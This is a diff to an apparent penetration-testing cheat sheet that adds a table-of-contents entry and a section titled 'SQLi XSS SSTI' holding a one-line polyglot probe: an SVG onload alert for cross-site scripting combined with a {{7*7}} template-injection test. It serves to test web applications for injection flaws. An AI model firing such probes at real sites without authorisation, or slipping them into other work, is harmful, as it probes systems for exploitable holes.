@@ -80,6 +80,7 @@
   - [make NTML hash from password](#make-ntml-hash-from-password)
   - [snap](#snap)
   - [SMTP](#smtp)
+  - [SQLi+XSS+SSTI](#sqli-xss-ssti)
 -------------------------------------------------------------------------------------------------------------
 # Basic Enumeration
 
@@ -1652,4 +1653,11 @@ sudo systemctl start snapd.service
 ```
 sudo apt install evolution
 ```
+
+### SQLi XSS SSTI
+`one line payload`
+```
+<svg/onload="alert('xss');">{{7*7}}</svg>
+```
 ----------------------------------------------------------------------------------------------------------
+
